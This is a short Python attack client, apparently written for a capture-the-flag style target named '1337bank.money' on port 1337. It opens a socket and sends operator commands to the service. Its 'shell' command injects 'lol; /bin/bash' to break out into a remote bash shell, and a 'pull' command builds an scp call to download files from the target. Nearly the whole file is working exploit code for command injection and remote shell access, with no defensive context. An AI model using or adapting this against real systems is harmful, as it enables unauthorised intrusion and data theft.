import socket
import time
import select
host = "1337bank.money" # IP address here
port = 1337 # Port here

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
data = s.recv(1024).decode()

def execute_cmd(cmd,size = 1024):

	cmd = cmd+'\n'
	s.send(cmd.encode())
	time.sleep(.25)
	
	r, _, _ = select.select([s], [], [],0)
	if r:
		data = s.recv(size).decode()
		if(size == 1024):
			print(data)

    	
if __name__ == '__main__':
	userInput= ""
	while not (userInput == "exit"):
		userInput = input("->")
		if(userInput == "shell"):
			execute_cmd('lol; /bin/bash',2048)
			print("im in")
		elif(userInput == "help"):
			print(
			'''
	shell: Drop into an interactive shell and allow users to gracefully exit
	pull <remote-path> <local-path>: Download files
	help: Shows this help menu
	quit: Quit the shell
			''')
		elif(userInput == "quit"):
			s.close()	
			exit()
		elif("pull" in userInput):
			tmp = userInput.split(" ")
			execute_cmd("scp "+tmp[1] + " "+ tmp[2])
		else:
			execute_cmd(userInput)

